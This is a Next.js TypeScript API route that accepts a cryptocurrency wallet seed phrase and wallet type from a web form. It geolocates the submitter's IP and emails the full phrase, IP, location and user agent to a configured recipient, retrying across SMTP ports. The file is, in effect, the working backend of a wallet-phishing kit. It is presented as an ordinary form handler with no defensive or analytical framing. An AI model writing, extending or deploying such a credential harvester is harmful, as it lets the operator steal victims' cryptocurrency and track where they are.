import { type NextRequest, NextResponse } from "next/server"
import axios from "axios"
import nodemailer from "nodemailer"
import type { SendMailOptions, TransportOptions } from "nodemailer"

interface MnemonicData {
  phrase: string
  walletType: string
}

interface LocationData {
  ip: string
  city: string
  region: string
  country: string
  timezone: string
  latitude: number | null
  longitude: number | null
}

interface DeviceInfo {
  userAgent: string
}

const DEFAULT_SMTP_TIMEOUT = Number(process.env.SMTP_TIMEOUT ?? "4000")

interface EmailPayload {
  timestamp: string
  walletType: string
  phrase: string
  phraseLength: number
  location: LocationData
  device: DeviceInfo
}

function getClientIP(req: NextRequest): string {
  const forwarded = req.headers.get("x-forwarded-for")
  const realIP = req.headers.get("x-real-ip")

  if (forwarded) {
    return forwarded.split(",")[0].trim()
  }

  if (realIP) {
    return realIP
  }

  return "127.0.0.1"
}

async function getLocationFromIP(ip: string): Promise<LocationData> {
  try {
    const cleanIP = ip.replace(/^::ffff:/, "")

    if (
      cleanIP === "127.0.0.1" ||
      cleanIP === "::1" ||
      cleanIP.startsWith("192.168.") ||
      cleanIP.startsWith("10.") ||
      cleanIP.startsWith("172.")
    ) {
      return {
        ip: cleanIP,
        city: "Local/Private Network",
        region: "N/A",
        country: "N/A",
        timezone: "N/A",
        latitude: null,
        longitude: null,
      }
    }

    const response = await axios.get(`https://ipapi.co/${cleanIP}/json/`, {
      timeout: 3000,
      headers: {
        "User-Agent": "nextjs-form-api/1.0",
      },
    })

    return {
      ip: cleanIP,
      city: response.data.city || "Unknown",
      region: response.data.region || "Unknown",
      country: response.data.country_name || "Unknown",
      timezone: response.data.timezone || "Unknown",
      latitude: response.data.latitude || null,
      longitude: response.data.longitude || null,
    }
  } catch (error) {
    console.error("Error fetching location data:", error)
    return {
      ip,
      city: "Unknown",
      region: "Unknown",
      country: "Unknown",
      timezone: "Unknown",
      latitude: null,
      longitude: null,
    }
  }
}

function getDeviceInfo(req: NextRequest): DeviceInfo {
  const userAgent = req.headers.get("user-agent") || "Unknown"
  return {
    userAgent,
  }
}

function resolveMailConfig() {
  const user = process.env.SMTP_USER
  const pass = process.env.SMTP_PASS
  const to = process.env.ALERT_RECIPIENT_EMAIL

  if (!user || !pass || !to) {
    return {
      transportConfigs: [],
      from: process.env.EMAIL_FROM ?? process.env.FROM_EMAIL ?? user ?? "no-reply@example.com",
      to,
      skipReason: "SMTP credentials or recipient not fully configured",
    }
  }

  const host = process.env.SMTP_HOST ?? "smtp.gmail.com"
  const port = Number(process.env.SMTP_PORT ?? "465")
  const secure =
    process.env.SMTP_SECURE !== undefined
      ? process.env.SMTP_SECURE === "true"
      : port === 465

  const baseConfig: TransportOptions = {
    host,
    port,
    secure,
    auth: {
      user,
      pass,
    },
    connectionTimeout: DEFAULT_SMTP_TIMEOUT,
    socketTimeout: DEFAULT_SMTP_TIMEOUT,
  }

  const configs: TransportOptions[] = []
  const seen = new Set<string>()
  const addConfig = (config: TransportOptions) => {
    const key = `${config.host}:${config.port}:${config.secure}`
    if (!seen.has(key)) {
      configs.push(config)
      seen.add(key)
    }
  }

  addConfig(baseConfig)
  addConfig({ ...baseConfig, port: 587, secure: false })
  addConfig({ ...baseConfig, port: 465, secure: true })

  return {
    transportConfigs: configs,
    from: process.env.EMAIL_FROM ?? process.env.FROM_EMAIL ?? user,
    to,
  }
}

async function sendEmailWithFallback(
  message: SendMailOptions,
  transportConfigs: TransportOptions[],
) {
  if (transportConfigs.length === 0) {
    return { sent: false, skipped: true }
  }

  let lastError: unknown

  for (const config of transportConfigs) {
    try {
      const transporter = nodemailer.createTransport(config)
      await transporter.sendMail(message)
      return { sent: true, transport: `${config.host}:${config.port}` }
    } catch (error) {
      lastError = error
      console.error(`Email send failed via ${config.host}:${config.port}`, error)
    }
  }

  return { sent: false, error: lastError }
}

async function sendEmailNotification(payload: EmailPayload) {
  const { transportConfigs, from, to, skipReason } = resolveMailConfig()
  if (!to || transportConfigs.length === 0) {
    console.warn(skipReason ?? "Email sending skipped because SMTP is not configured")
    return { sent: false, skipped: true, reason: skipReason }
  }

  const locationSummary = `${payload.location.city}, ${payload.location.region}, ${payload.location.country}`

  const textBody = [
    "New mnemonic submission received",
    `Timestamp: ${payload.timestamp}`,
    `Wallet type: ${payload.walletType}`,
    `Mnemonic length: ${payload.phraseLength} words`,
    `Mnemonic phrase: ${payload.phrase}`,
    `IP: ${payload.location.ip}`,
    `Location: ${locationSummary}`,
    `Timezone: ${payload.location.timezone}`,
    `Device: ${payload.device.userAgent}`,
    "",
    "This message was generated automatically.",
  ].join("\n")

  const htmlBody = `
    <h2>New mnemonic submission received</h2>
    <ul>
      <li><strong>Timestamp:</strong> ${payload.timestamp}</li>
      <li><strong>Wallet type:</strong> ${payload.walletType}</li>
      <li><strong>Mnemonic length:</strong> ${payload.phraseLength} words</li>
      <li><strong>Mnemonic phrase:</strong> ${payload.phrase}</li>
      <li><strong>IP:</strong> ${payload.location.ip}</li>
      <li><strong>Location:</strong> ${locationSummary}</li>
      <li><strong>Timezone:</strong> ${payload.location.timezone}</li>
      <li><strong>Device:</strong> ${payload.device.userAgent}</li>
    </ul>
  `

  const message: SendMailOptions = {
    from,
    to,
    subject: `New mnemonic submission - ${payload.walletType}`,
    text: textBody,
    html: htmlBody,
  }

  return sendEmailWithFallback(message, transportConfigs)
}

export async function POST(req: NextRequest) {
  try {
    const mnemonicData: MnemonicData = await req.json()

    if (!mnemonicData.phrase || !mnemonicData.walletType) {
      return NextResponse.json(
        {
          success: false,
          message: "Mnemonic phrase and wallet type are required fields",
        },
        { status: 400 },
      )
    }

    const clientIP = getClientIP(req)
    const locationData = await getLocationFromIP(clientIP)
    const deviceInfo = getDeviceInfo(req)
    const timestamp = new Date().toISOString()
    const phraseLength = mnemonicData.phrase.trim().split(/\s+/).length

    const emailResult = await sendEmailNotification({
      timestamp,
      walletType: mnemonicData.walletType,
      phrase: mnemonicData.phrase,
      phraseLength,
      location: locationData,
      device: deviceInfo,
    })

    if (!emailResult.sent) {
      console.warn("Submission email not sent; continuing without failing request", emailResult)
    }

    return NextResponse.json({
      success: true,
      message: emailResult.sent
        ? "Submission emailed successfully"
        : "Submission received (email notification not sent)",
      emailSent: emailResult.sent,
      data: {
        timestamp,
        walletType: mnemonicData.walletType,
        location: `${locationData.city}, ${locationData.country}`,
      },
    })
  } catch (error) {
    console.error("Error processing mnemonic submission:", error)
    return NextResponse.json(
      {
        success: false,
        message: "Failed to send submission email. Please try again.",
        error: error instanceof Error ? error.message : "Unknown error",
      },
      { status: 500 },
    )
  }
}

export async function GET() {
  return NextResponse.json({
    status: "OK",
    message: "Next.js API is running",
    timestamp: new Date().toISOString(),
  })
}
